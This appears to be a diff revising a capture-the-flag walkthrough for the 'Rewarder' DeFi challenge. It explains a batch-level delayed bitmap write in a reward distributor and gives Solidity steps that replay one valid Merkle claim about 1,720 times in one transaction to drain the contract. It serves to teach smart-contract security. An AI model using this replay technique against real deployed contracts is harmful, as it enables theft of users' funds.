@@ -1,50 +1,61 @@
-The exploit works by abusing a **critical logic flaw** in the `claimRewards` function where state updates are delayed.
+## Challenge 5 Walkthrough: The Rewarder
 
-### Step-by-Step Breakdown
+### Vulnerability
 
-#### 1. **Identify Player's Claim Data**
-- The player is at **index 188** in both DVT and WETH distribution lists.
-- Their individual claim amounts:
-  - DVT: `11,524,763,827,831,882`
-  - WETH: `1,171,088,749,244,340`
+The vulnerability lies in `TheRewarderDistributor.claimRewards()`'s delayed state update:
 
-These values are derived from the JSON distribution files.
-
-#### 2. **Load Merkle Proofs**
 ```solidity
-bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+for (uint256 i = 0; i < inputClaims.length; i++) {
+    // ...verifies Merkle proof and transfers tokens for each claim...
+    
+    // State update only happens on the LAST claim for each token batch:
+    if (i == inputClaims.length - 1) {
+        if (!_setClaimed(token, amount, wordPosition, bitsSet))
+            revert AlreadyClaimed();
+    }
+}
+```
+
+- `_setClaimed()` writes to the "already claimed" bitmap **only after the entire array is processed**, not per individual claim
+- Merkle proof verification passes for every copy of the same valid claim — the proof itself is valid, only the bitmap prevents replay
+- Since the bitmap isn't updated until the last item, all intermediate transfers succeed before any replay protection fires
+- A player with a valid claim can submit it hundreds of times in a single transaction, draining the distributor before the bitmap catches up
+
+### Exploit
+
+The player's address `0x44E97aF4418b7a17AABD8090bEA0A471a366305C` is at **index 188** in both distribution files, confirmed in the JSON data:
+- DVT claim amount: `11,524,763,827,831,882`
+- WETH claim amount: `1,171,088,749,244,340`
+
+These small individual amounts are what make the attack viable — each fits into the total distribution balance hundreds of times.
+
+#### Step 1 — Load Merkle Leaves
+
+```solidity
+bytes32[] memory dvtLeaves  = _loadRewards("/test/the-rewarder/dvt-distribution.json");
 bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
 ```
-- Loads all Merkle leaves to generate valid proofs for the player's claims.
 
-#### 3. **Calculate Number of Repeated Claims**
+Loads all 1,000 beneficiary entries from both JSON files to reconstruct the Merkle tree, enabling valid proof generation for any index.
 
-```solidity
-uint256 dvtClaims = dvt.balanceOf(address(distributor)) / playerDvtAmount;
-uint256 wethClaims = weth.balanceOf(address(distributor)) / playerWethAmount;   
-```
-- Uses **actual remaining balances** after Alice’s claim.
-- Ensures no over-claiming and meets test thresholds. 
-
----
-
-Alternatively can use the following (former solution here)
+#### Step 2 — Calculate Number of Repeated Claims
 
 ```solidity
-uint256 dvtClaims = TOTAL_DVT_DISTRIBUTION_AMOUNT / playerDvtAmount; // ~867
-uint256 wethClaims = TOTAL_WETH_DISTRIBUTION_AMOUNT / playerWethAmount; // ~853
+uint256 dvtClaims  = dvt.balanceOf(address(distributor))  / playerDvtAmount;
+uint256 wethClaims = weth.balanceOf(address(distributor)) / playerWethAmount;
 ```
-- Determines how many times the player's claim can be repeated to drain the full balance.
 
+Uses **actual remaining balances** post-Alice's claim rather than the original totals. Both approaches work:
 
-> Both approaches work because:
-- The challenge goal is to reduce the distributor's balance below the threshold (`1e16` for DVT, `1e15` for WETH), not necessarily to claim *exactly* the remaining amount.
-- Using `TOTAL_...` assumes full distribution, which slightly overestimates but still drains enough.
-- Using `balanceOf` dynamically reads the actual available balance, reflecting  the real state post-Alice’s claim, making it **more robust and precise**, especially if state changes occur.
+| Method | Value | Behaviour |
+|--------|-------|-----------|
+| `balanceOf(distributor) / amount` | ~865 DVT + ~852 WETH | Reads real state after Alice — more precise |
+| `TOTAL_DISTRIBUTION / amount` | ~867 DVT + ~853 WETH | Slightly overestimates but still drains below threshold |
 
+The goal is reducing the distributor below `1e16` DVT and `1e15` WETH — not draining to exactly zero — so either works. The `balanceOf` approach is more robust since it reflects actual on-chain state regardless of prior claims.
 
+#### Step 3 — Build ~1,720 Identical Claims
 
-#### 4. **Build Claim Array**
 ```solidity
 Claim[] memory claims = new Claim[](totalClaims);
 for (uint256 i = 0; i < totalClaims; i++) {
@@ -65,26 +76,26 @@ for (uint256 i = 0; i < totalClaims; i++) {
     }
 }
 ```
-- Constructs an array of **~1,720 identical claims** — first all DVT, then all WETH.
-- Each claim has a valid Merkle proof for index 188.
 
-#### 5. **Exploit Delayed State Update**
+Every claim in the array is structurally identical — same batch, same amount, same valid Merkle proof for index 188. First all DVT claims fill the front of the array, then all WETH claims.
+
+#### Step 4 — Submit All Claims in One Transaction
+
 ```solidity
 distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
 ```
-- The vulnerability: `_setClaimed` is only called **after** processing groups of claims.
-- The loop transfers rewards **before** marking them as claimed.
-- Result: Every repeated claim is treated as valid → full drain.
 
-#### 6. **Transfer Recovered Funds**
+The contract processes all ~1,720 transfers before the bitmap is written once at the end. The distributor is drained in a single call.
+
+#### Step 5 — Transfer to Recovery
+
 ```solidity
 dvt.transfer(recovery, dvt.balanceOf(player));
 weth.transfer(recovery, weth.balanceOf(player));
 ```
-- Sends all stolen tokens to the recovery address to complete the challenge.
 
 ### Why It Works
-- The contract assumes each claim is unique and won't be replayed.
-- By submitting many copies of a **single valid claim**, the attacker bypasses the one-time-use restriction.
-- This is a **replay attack within a single transaction**, made possible by poor state management.
 
+The root cause is treating claim validation as a batch-level concern rather than a per-claim concern. A correct implementation would call `_setClaimed()` before each individual transfer — checking and writing the bitmap atomically per claim. Instead, the contract verifies the Merkle proof per item but defers the write until the batch ends, creating a window where the same valid proof can be replayed arbitrarily many times within that single call.
+
+This is an **intra-transaction replay attack via delayed state write** — the attacker never leaves the transaction, so the bitmap is never read as "claimed" during any of the ~1,720 iterations. One valid proof, hundreds of payouts, one bitmap write at the very end.
